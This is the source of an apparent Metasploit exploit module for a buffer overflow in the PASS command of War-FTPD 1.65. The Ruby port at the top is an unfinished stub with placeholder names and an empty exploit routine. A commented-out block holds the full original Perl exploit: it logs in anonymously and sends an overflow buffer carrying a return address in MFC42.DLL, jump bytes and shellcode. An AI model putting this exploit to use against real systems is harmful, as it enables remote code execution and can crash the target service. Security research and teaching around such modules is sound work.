require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'War-FTPD 1.65 PASS Overflow',
			'Description'    => %q{
				This exploits the buffer overflow found in the PASS command
				in War-FTPD 1.65. This particular module will only work
				reliably against Windows 2000 targets. The server must be
				configured to allow anonymous logins for this exploit to
				succeed. A failed attempt will bring down the service
				completely.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '875'],
					[ 'URL', 'http://lists.insecure.org/lists/bugtraq/1998/Feb/0014.html'],
					[ 'MIL', '74'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "\x00\x2b\x26\x3d\x25\x0a\x0d\x20",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Mar 19 1998',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::warftpd_165_pass;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };
my $info =
  {
	'Name'    => 'War-FTPD 1.65 PASS Overflow',
	'Version' => '$Revision$',

	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000' ],
	'Priv'  => 0,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'  => 512,
		'BadChars'  => "\x00+&=%\x0a\x0d\x20",
	  },

	'Description'  =>  Pex::Text::Freeform(qq{
        This exploits the buffer overflow found in the PASS command
        in War-FTPD 1.65. This particular module will only work
        reliably against Windows 2000 targets. The server must be
        configured to allow anonymous logins for this exploit to
        succeed. A failed attempt will bring down the service
        completely.    
}),

	'Refs'  =>
	  [
		['OSVDB', '875'],
		['URL',   'http://lists.insecure.org/lists/bugtraq/1998/Feb/0014.html'],
		['MIL', '74'],
	  ],

	'DefaultTarget' => 0,
	'Targets' => [ ["Windows 2000"] ],

	'Keys'  => ['warftpd'],

	'DisclosureDate' => 'Mar 19 1998',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my $request = ("META" x 1024);

	# this return address is a jmp ebx in the included MFC42.DLL
	substr($request, 562, 4, pack("V", 0x5f4e772b));

	substr($request, 558, 4, "\xeb\x08\xeb\x08");
	substr($request, 566, length($shellcode), $shellcode);

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	my $r = $s->Recv(-1, 20);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }

	$self->PrintLine("[*] REMOTE> $r");
	$r = $s->Recv(-1, 10);

	$s->Send("USER ANONYMOUS\n");
	$r = $s->Recv(-1, 20);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	$self->PrintLine("[*] REMOTE> $r");

	$s->Send("PASS $request\n");
	$r = $s->Recv(-1, 20);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	$self->PrintLine("[*] REMOTE> $r");

	return;
}


=end


end
end	
